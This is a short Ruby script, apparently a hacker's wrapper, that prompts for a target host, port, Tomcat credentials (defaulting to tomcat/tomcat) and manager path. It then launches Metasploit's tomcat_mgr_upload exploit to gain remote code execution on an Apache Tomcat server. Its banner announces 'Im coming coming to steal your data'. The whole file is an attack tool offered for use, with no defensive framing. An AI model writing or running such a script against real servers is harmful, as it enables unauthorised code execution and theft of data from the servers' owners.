require 'colorize'
puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  

   1st Try {set USERNAME tomcat; set PASSWORD tomcat}

  Apache Tomcat Manager Authenticated Upload Code Execution

				    Java Universal
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] What is the Username? [Default is 'tomcat']".blue
print " [!] ---> ".yellow
username = gets.chomp

puts " [?] What is the Password? [Default is 'tomcat']".blue
print " [!] ---> ".yellow
password = gets.chomp

puts " [?] The URI path of the manager app [Default is '/manager' or /html/upload and /undeploy can be used]".blue
print " [!] ---> ".yellow
url = gets.chomp

exec("msfconsole -x 'use exploit multi/http/tomcat_mgr_upload' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'setg USERNAME #{username}' -x 'setg PASSWORD #{password}' -x 'set TARGETURI #{url}' -x 'run'")

